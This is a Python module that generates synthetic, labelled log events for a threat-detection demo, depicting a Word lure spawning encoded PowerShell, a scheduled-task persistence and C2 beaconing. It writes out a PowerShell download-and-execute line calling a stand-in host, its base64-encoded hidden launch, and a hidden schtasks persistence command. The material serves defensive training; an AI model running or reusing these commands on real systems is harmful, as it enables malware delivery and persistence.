"""Synthetic events for the demo. Every event carries ``sample: "SAMPLE DATA - not real"``.

Only documentation addresses (RFC 5737 / 3849) and ``.example`` domains are used.
The story: on DEMO-WS07 a Word document starts encoded PowerShell, which
downloads a payload from update-check.example (203.0.113.66), adds a scheduled
task and beacons back. Everything else is ordinary noise, including a known
admin script that also uses encoded PowerShell (benign).
"""

from __future__ import annotations

import base64
from datetime import datetime, timedelta, timezone

LABEL = "SAMPLE DATA - not real"
C2_IP = "203.0.113.66"
C2_DOMAIN = "update-check.example"
PAYLOAD = f"IEX (New-Object Net.WebClient).DownloadString('http://{C2_DOMAIN}/a.ps1')"
ENC = base64.b64encode(PAYLOAD.encode("utf-16-le")).decode()
ADMIN = "Get-ChildItem C:\\Logs | Remove-Item -Recurse -WhatIf"
ADMIN_ENC = base64.b64encode(ADMIN.encode("utf-16-le")).decode()

ADVISORY_TITLE = "SAMPLE advisory: document lure leads to PowerShell downloader"
ADVISORY_TEXT = f"""SAMPLE DATA - not a real advisory.
A phishing campaign sends Word documents that start PowerShell with an encoded command (T1059.001, T1204.002).
The script downloads a second stage from hxxp://{C2_DOMAIN.replace('.', '[.]')}/a.ps1 (T1105), persists with a
scheduled task (T1053.005) and beacons over HTTP to {C2_IP.replace('.', '[.]')} (T1071.001).
"""


def events(now: datetime | None = None) -> list[dict]:
    now = (now or datetime.now(timezone.utc)).replace(microsecond=0)
    t = lambda h, m=0: (now - timedelta(hours=h, minutes=m)).isoformat().replace("+00:00", "Z")  # noqa: E731
    ev: list[dict] = []

    def add(ts, **kw):
        ev.append({"@timestamp": ts, "sample": LABEL, **kw})

    hosts = [f"DEMO-WS{n:02d}" for n in range(1, 13)]
    users = ["a.rivera", "b.chen", "c.okafor", "d.novak", "e.silva", "f.haddad"]
    for i in range(160):          # ordinary process noise
        h = hosts[i % len(hosts)]
        add(t(i % 150, (i * 7) % 60), event={"category": "process", "action": "start"}, host={"name": h},
            user={"name": users[i % len(users)]},
            process={"name": ["chrome.exe", "outlook.exe", "teams.exe", "explorer.exe", "excel.exe"][i % 5],
                     "parent": {"name": "explorer.exe"}, "command_line": ""})
    for i in range(120):          # ordinary network noise
        add(t(i % 160, (i * 11) % 60), event={"category": "network", "action": "connection"},
            host={"name": hosts[i % len(hosts)]}, destination={"ip": f"198.51.100.{10 + i % 40}", "port": 443,
                                                               "domain": f"cdn{i % 6}.service.example"})
    for d in range(6):            # the known admin script (benign encoded PowerShell)
        add(t(24 * d + 3), event={"category": "process", "action": "start"}, host={"name": "DEMO-ADM01"},
            user={"name": "svc.maint"}, process={"name": "powershell.exe", "parent": {"name": "svchost.exe"},
                                                "command_line": f"powershell.exe -NoProfile -enc {ADMIN_ENC}"})
    # the malicious chain on DEMO-WS07, 30 hours ago
    base = 30
    add(t(base, 2), event={"category": "process", "action": "start"}, host={"name": "DEMO-WS07"},
        user={"name": "c.okafor"}, process={"name": "winword.exe", "parent": {"name": "outlook.exe"},
                                           "command_line": "WINWORD.EXE /n \"Invoice_8841.docm\""})
    add(t(base, 1), event={"category": "process", "action": "start"}, host={"name": "DEMO-WS07"},
        user={"name": "c.okafor"}, process={"name": "powershell.exe", "parent": {"name": "winword.exe"},
                                           "command_line": f"powershell.exe -nop -w hidden -enc {ENC}"})
    add(t(base, 0), event={"category": "network", "action": "connection"}, host={"name": "DEMO-WS07"},
        process={"name": "powershell.exe"}, destination={"ip": C2_IP, "port": 80, "domain": C2_DOMAIN})
    add(t(base - 1), event={"category": "process", "action": "start"}, host={"name": "DEMO-WS07"},
        user={"name": "c.okafor"}, process={"name": "schtasks.exe", "parent": {"name": "powershell.exe"},
                                           "command_line": "schtasks /create /sc minute /mo 30 /tn \"OfficeUpdate\" "
                                                           "/tr \"powershell -w hidden -f C:\\Users\\Public\\u.ps1\""})
    for k in range(1, 50):        # beacon every 30 minutes
        add(t(base - 1, -30 * k) if base * 60 - 60 - 30 * k > 0 else t(0),
            event={"category": "network", "action": "connection"}, host={"name": "DEMO-WS07"},
            process={"name": "powershell.exe"}, destination={"ip": C2_IP, "port": 80, "domain": C2_DOMAIN})
    ev.sort(key=lambda e: e["@timestamp"], reverse=True)
    return ev
